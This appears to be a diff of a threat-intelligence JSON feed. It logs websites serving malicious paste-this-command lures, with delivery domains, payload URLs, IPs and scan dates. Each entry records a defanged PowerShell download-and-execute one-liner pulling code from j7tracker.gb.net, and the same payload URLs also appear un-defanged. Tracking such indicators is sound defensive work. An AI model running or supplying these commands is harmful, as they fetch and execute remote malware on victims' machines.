@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "www.miltonmovers.co.ke",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a44602b46c6fe499"
+    ],
+    "IP": [
+      "23.153.104.141"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a44602b46c6fe499')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a44602b46c6fe499"
+    ],
+    "ReportId": "cmwq86im425xo0omlz7z1faw6",
+    "ScannedAt": "2026-11-21T09:48:26.236000+00:00"
+  },
+  {
     "UrlDomain": "oregonstate.edu.pl",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -1938,43 +1957,5 @@
     ],
     "ReportId": "cmwng8mio1wbu0oml0obq4vwk",
     "ScannedAt": "2026-11-19T11:10:43.018000+00:00"
-  },
-  {
-    "UrlDomain": "karat25.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/528af28445997174"
-    ],
-    "IP": [
-      "184.168.107.182"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/528af28445997174')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/528af28445997174"
-    ],
-    "ReportId": "cmwndcg261w1d0oml4mnk1sjd",
-    "ScannedAt": "2026-11-19T09:49:42.393000+00:00"
-  },
-  {
-    "UrlDomain": "www.insourcenet.co.za",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/eb7b8d2ecd60505d"
-    ],
-    "IP": [
-      "41.204.202.6"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7b8d2ecd60505d')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/eb7b8d2ecd60505d"
-    ],
-    "ReportId": "cmwndbx891w080oml29yh3d48",
-    "ScannedAt": "2026-11-19T09:49:17.899000+00:00"
   }
 ]
